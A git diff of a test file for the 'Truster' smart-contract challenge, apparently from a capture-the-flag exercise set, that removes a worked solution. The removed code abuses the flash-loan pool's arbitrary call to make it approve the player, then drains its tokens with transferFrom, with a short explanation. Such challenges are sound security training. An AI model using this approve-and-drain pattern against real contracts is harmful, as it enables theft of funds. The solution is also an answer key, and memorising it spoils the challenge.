@@ -24,19 +24,6 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        const ABI = ["function approve(address spender, uint256 amount)"];
-        const interface = new ethers.utils.Interface(ABI);
-        const calldata = interface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);
-        
-        await pool.connect(player).flashLoan(0, player.address, token.address, calldata);
-        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
-
-        /*
-        Explanation:
-        The flash loan pool calls any arbitrary target contract with any call data.
-        So we just tell it to call the DVT contract and approve our attacker to move its tokens.
-        Then we move the tokens later.
-        */
     });
 
     after(async function () {
